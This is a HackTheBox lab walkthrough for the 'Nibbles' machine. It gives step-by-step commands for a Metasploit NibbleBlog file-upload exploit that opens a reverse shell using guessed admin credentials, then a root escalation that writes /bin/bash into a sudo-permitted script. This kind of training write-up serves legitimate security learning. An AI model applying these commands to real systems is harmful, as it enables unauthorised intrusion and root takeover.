## Initial Exploit - 
***
The homepage leaks the URL to the blog:  
> curl http://10.129.84.175/

![](/home/kali/Walkthroughs/HackTheBox/nibbles/images/curl.png)

The page is running NibblesBlog v4.0.3. Metasploit has an exploit available [here](https://www.exploit-db.com/exploits/38489). Run the exploit: 

> sudo msfdb run

> use multi/http/nibbleblog_file_upload

> set rhost 10.129.84.175

> set lhost tun0 

> set lport 80

The blog is using the weak credentials **admin:nibbles**:  
> set username admin

> set password nibbles

> run

The shell returns as nibbler.

<div style="page-break-after: always;"></div>

## Privilege Escalation - 
***
Nibbler is allowed to run the script at **/home/nibbler/personal/stuff/monitor.sh** as root without a password. 
![](/home/kali/Walkthroughs/HackTheBox/nibbles/images/sudol.png)

That script and directory do not exist. Create them:  
> mkdir -p /home/nibbler/personal/stuff

> echo /bin/bash > /home/nibbler/personal/stuff/monitor.sh

Make the script executable:  
> chmod +x /home/nibbler/personal/stuff/monitor.sh

Run the script as root:  
> sudo /home/nibbler/personal/stuff/monitor.sh

<div style="page-break-after: always;"></div>

## Proof - 
***
### User:

![](/home/kali/Walkthroughs/HackTheBox/nibbles/images/user.png)

### Root:

![](/home/kali/Walkthroughs/HackTheBox/nibbles/images/root.png)